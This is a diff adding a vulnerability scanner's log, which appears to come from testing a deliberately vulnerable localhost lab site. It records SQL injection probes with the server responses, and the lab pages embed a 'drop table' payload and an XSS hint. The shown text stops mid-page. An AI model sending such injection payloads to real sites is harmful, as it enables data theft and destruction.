@@ -1,0 +1,1253 @@
+Target: http://127.0.0.1:8000
+Date: 16-07-2021 12:12
+
+Possible SQL injection (Blind): http://127.0.0.1:8000/xss.html?xss='+or+1%3D1%23'; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html><head></head><body>
+        <h1> XSS-attacks </h1>
+        <p>This site contains the possibility for XSS-attacks</p>
+        <p> Possible xss-exploit input: &lt; script &gt; alert(1) &lt; /script &gt; (Remove space after the &lt; chars)</p> 
+        
+        <form>
+            <label for="xss">XSS-Input:
+                <!-- possible xss-exploit input: <script> alert(1) </script> -->
+                <input id="xss" name="xss"><button type="submit">Submit</button><br>
+            </label>
+            <label for="out">output:
+                <output id="out_table_cont">'+or+1%3D1%23'</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+ negative Result: 
+<html><head></head><body>
+        <h1> XSS-attacks </h1>
+        <p>This site contains the possibility for XSS-attacks</p>
+        <p> Possible xss-exploit input: &lt; script &gt; alert(1) &lt; /script &gt; (Remove space after the &lt; chars)</p> 
+        
+        <form>
+            <label for="xss">XSS-Input:
+                <!-- possible xss-exploit input: <script> alert(1) </script> -->
+                <input id="xss" name="xss"><button type="submit">Submit</button><br>
+            </label>
+            <label for="out">output:
+                <output id="out_table_cont">'+or+1%3D2%23'</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/xss.html?xss="+or+1%3D1%23"; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html><head></head><body>
+        <h1> XSS-attacks </h1>
+        <p>This site contains the possibility for XSS-attacks</p>
+        <p> Possible xss-exploit input: &lt; script &gt; alert(1) &lt; /script &gt; (Remove space after the &lt; chars)</p> 
+        
+        <form>
+            <label for="xss">XSS-Input:
+                <!-- possible xss-exploit input: <script> alert(1) </script> -->
+                <input id="xss" name="xss"><button type="submit">Submit</button><br>
+            </label>
+            <label for="out">output:
+                <output id="out_table_cont">"+or+1%3D1%23"</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+ negative Result: 
+<html><head></head><body>
+        <h1> XSS-attacks </h1>
+        <p>This site contains the possibility for XSS-attacks</p>
+        <p> Possible xss-exploit input: &lt; script &gt; alert(1) &lt; /script &gt; (Remove space after the &lt; chars)</p> 
+        
+        <form>
+            <label for="xss">XSS-Input:
+                <!-- possible xss-exploit input: <script> alert(1) </script> -->
+                <input id="xss" name="xss"><button type="submit">Submit</button><br>
+            </label>
+            <label for="out">output:
+                <output id="out_table_cont">'+or+1%3D2%23'</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/xss.html?xss='+or+1%3D1--'; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html><head></head><body>
+        <h1> XSS-attacks </h1>
+        <p>This site contains the possibility for XSS-attacks</p>
+        <p> Possible xss-exploit input: &lt; script &gt; alert(1) &lt; /script &gt; (Remove space after the &lt; chars)</p> 
+        
+        <form>
+            <label for="xss">XSS-Input:
+                <!-- possible xss-exploit input: <script> alert(1) </script> -->
+                <input id="xss" name="xss"><button type="submit">Submit</button><br>
+            </label>
+            <label for="out">output:
+                <output id="out_table_cont">'+or+1%3D1--'</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+ negative Result: 
+<html><head></head><body>
+        <h1> XSS-attacks </h1>
+        <p>This site contains the possibility for XSS-attacks</p>
+        <p> Possible xss-exploit input: &lt; script &gt; alert(1) &lt; /script &gt; (Remove space after the &lt; chars)</p> 
+        
+        <form>
+            <label for="xss">XSS-Input:
+                <!-- possible xss-exploit input: <script> alert(1) </script> -->
+                <input id="xss" name="xss"><button type="submit">Submit</button><br>
+            </label>
+            <label for="out">output:
+                <output id="out_table_cont">'+or+1%3D2%23'</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/xss.html?xss="+or+1%3D1--"; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html><head></head><body>
+        <h1> XSS-attacks </h1>
+        <p>This site contains the possibility for XSS-attacks</p>
+        <p> Possible xss-exploit input: &lt; script &gt; alert(1) &lt; /script &gt; (Remove space after the &lt; chars)</p> 
+        
+        <form>
+            <label for="xss">XSS-Input:
+                <!-- possible xss-exploit input: <script> alert(1) </script> -->
+                <input id="xss" name="xss"><button type="submit">Submit</button><br>
+            </label>
+            <label for="out">output:
+                <output id="out_table_cont">"+or+1%3D1--"</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+ negative Result: 
+<html><head></head><body>
+        <h1> XSS-attacks </h1>
+        <p>This site contains the possibility for XSS-attacks</p>
+        <p> Possible xss-exploit input: &lt; script &gt; alert(1) &lt; /script &gt; (Remove space after the &lt; chars)</p> 
+        
+        <form>
+            <label for="xss">XSS-Input:
+                <!-- possible xss-exploit input: <script> alert(1) </script> -->
+                <input id="xss" name="xss"><button type="submit">Submit</button><br>
+            </label>
+            <label for="out">output:
+                <output id="out_table_cont">'+or+1%3D2%23'</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql_insert='+or+1%3D1%23'; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html><head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p>A SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "'+or+1%3D1%23'")]</output>
+            </label>
+        </form>
+        
+        <p id="Exploit">The given Input is injected unchecked into the query "Select * from htmlInput where input = '-input-'"</p>
+        <p id="Exploit">Possible exploit: '; drop table htmlInput; select * from htmlInput where input = ' </p>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+ negative Result: 
+<html><head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p>A SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "'+or+1%3D1%23'"), (3, "'+or+1%3D2%23'")]</output>
+            </label>
+        </form>
+        
+        <p id="Exploit">The given Input is injected unchecked into the query "Select * from htmlInput where input = '-input-'"</p>
+        <p id="Exploit">Possible exploit: '; drop table htmlInput; select * from htmlInput where input = ' </p>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql_insert="+or+1%3D1%23"; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html><head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p>A SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "'+or+1%3D1%23'"), (3, "'+or+1%3D2%23'"), (4, '"+or+1%3D1%23"')]</output>
+            </label>
+        </form>
+        
+        <p id="Exploit">The given Input is injected unchecked into the query "Select * from htmlInput where input = '-input-'"</p>
+        <p id="Exploit">Possible exploit: '; drop table htmlInput; select * from htmlInput where input = ' </p>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+ negative Result: 
+<html><head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p>A SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "'+or+1%3D1%23'"), (3, "'+or+1%3D2%23'"), (4, '"+or+1%3D1%23"'), (5, "'+or+1%3D2%23'")]</output>
+            </label>
+        </form>
+        
+        <p id="Exploit">The given Input is injected unchecked into the query "Select * from htmlInput where input = '-input-'"</p>
+        <p id="Exploit">Possible exploit: '; drop table htmlInput; select * from htmlInput where input = ' </p>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql_insert='+or+1%3D1--'; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html><head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p>A SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "'+or+1%3D1%23'"), (3, "'+or+1%3D2%23'"), (4, '"+or+1%3D1%23"'), (5, "'+or+1%3D2%23'"), (6, "'+or+1%3D1--'")]</output>
+            </label>
+        </form>
+        
+        <p id="Exploit">The given Input is injected unchecked into the query "Select * from htmlInput where input = '-input-'"</p>
+        <p id="Exploit">Possible exploit: '; drop table htmlInput; select * from htmlInput where input = ' </p>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+ negative Result: 
+<html><head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p>A SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "'+or+1%3D1%23'"), (3, "'+or+1%3D2%23'"), (4, '"+or+1%3D1%23"'), (5, "'+or+1%3D2%23'"), (6, "'+or+1%3D1--'"), (7, "'+or+1%3D2%23'")]</output>
+            </label>
+        </form>
+        
+        <p id="Exploit">The given Input is injected unchecked into the query "Select * from htmlInput where input = '-input-'"</p>
+        <p id="Exploit">Possible exploit: '; drop table htmlInput; select * from htmlInput where input = ' </p>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql_insert="+or+1%3D1--"; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html><head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p>A SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "'+or+1%3D1%23'"), (3, "'+or+1%3D2%23'"), (4, '"+or+1%3D1%23"'), (5, "'+or+1%3D2%23'"), (6, "'+or+1%3D1--'"), (7, "'+or+1%3D2%23'"), (8, '"+or+1%3D1--"')]</output>
+            </label>
+        </form>
+        
+        <p id="Exploit">The given Input is injected unchecked into the query "Select * from htmlInput where input = '-input-'"</p>
+        <p id="Exploit">Possible exploit: '; drop table htmlInput; select * from htmlInput where input = ' </p>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+ negative Result: 
+<html><head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p>A SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "'+or+1%3D1%23'"), (3, "'+or+1%3D2%23'"), (4, '"+or+1%3D1%23"'), (5, "'+or+1%3D2%23'"), (6, "'+or+1%3D1--'"), (7, "'+or+1%3D2%23'"), (8, '"+or+1%3D1--"'), (9, "'+or+1%3D2%23'")]</output>
+            </label>
+        </form>
+        
+        <p id="Exploit">The given Input is injected unchecked into the query "Select * from htmlInput where input = '-input-'"</p>
+        <p id="Exploit">Possible exploit: '; drop table htmlInput; select * from htmlInput where input = ' </p>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql='; set @test = 'ksdjkfl'; select @test; #; Evidence: The Input 'ksdjkfl' is found in the response without it´s injection string
+request answer:
+<html><head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p>A SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">.</output>
+            </label>
+        </form>
+        
+        <p id="Exploit">The given Input is injected unchecked into the query "Select * from htmlInput where input = '-input-'"</p>
+        <p id="Exploit">Possible exploit: '; drop table htmlInput; select * from htmlInput where input = ' </p>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">[('ksdjkfl',)]</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql='+or+1%3D1%23'; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html><head></head><body>        <h1>Error accessing /sqlinjection.html?sql=%27%2Bor%2B1%253D1%2523%27&amp;submit_where=0</h1>        <p>1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or+1%3D1%23''' at line 1</p>                </body></html>
+ negative Result: 
+<html><head></head><body>        <h1>Error accessing /sqlinjection.html?sql=%27%2Bor%2B1%253D2%2523%27&amp;submit_where=0</h1>        <p>1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or+1%3D2%23''' at line 1</p>                </body></html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql="+or+1%3D1%23"; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html><head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p>A SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">.</output>
+            </label>
+        </form>
+        
+        <p id="Exploit">The given Input is injected unchecked into the query "Select * from htmlInput where input = '-input-'"</p>
+        <p id="Exploit">Possible exploit: '; drop table htmlInput; select * from htmlInput where input = ' </p>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">[(4, '"+or+1%3D1%23"')]</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+ negative Result: 
+<html><head></head><body>        <h1>Error accessing /sqlinjection.html?sql=%27%2Bor%2B1%253D2%2523%27&amp;submit_where=0</h1>        <p>1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or+1%3D2%23''' at line 1</p>                </body></html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql='+or+1%3D1--'; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html><head></head><body>        <h1>Error accessing /sqlinjection.html?sql=%27%2Bor%2B1%253D1--%27&amp;submit_where=0</h1>        <p>1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or+1%3D1--''' at line 1</p>                </body></html>
+ negative Result: 
+<html><head></head><body>        <h1>Error accessing /sqlinjection.html?sql=%27%2Bor%2B1%253D2%2523%27&amp;submit_where=0</h1>        <p>1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or+1%3D2%23''' at line 1</p>                </body></html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql="+or+1%3D1--"; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html><head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p>A SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">.</output>
+            </label>
+        </form>
+        
+        <p id="Exploit">The given Input is injected unchecked into the query "Select * from htmlInput where input = '-input-'"</p>
+        <p id="Exploit">Possible exploit: '; drop table htmlInput; select * from htmlInput where input = ' </p>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">[(8, '"+or+1%3D1--"')]</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+ negative Result: 
+<html><head></head><body>        <h1>Error accessing /sqlinjection.html?sql=%27%2Bor%2B1%253D2%2523%27&amp;submit_where=0</h1>        <p>1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or+1%3D2%23''' at line 1</p>                </body></html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/fileinclusion.html?fi='+or+1%3D1%23'; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html><head></head><body>
+        <h1> File Inclusion Attacks </h1>
+        <p>This site contains the possibility for File Inclusions like Local and Remote File Inclusion</p>
+        <p>The given file path will be executed by subprocess.run()</p>
+        <p>Example input: test.py</p>
+        
+        <form>
+            <label for="fi">File input:
+                <input id="fi" name="fi"><button type="submit">submit</button><br>
+            </label>
+        </form>
+        
+        <p>File executed: '+or+1%3D1%23'; Result: </p>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
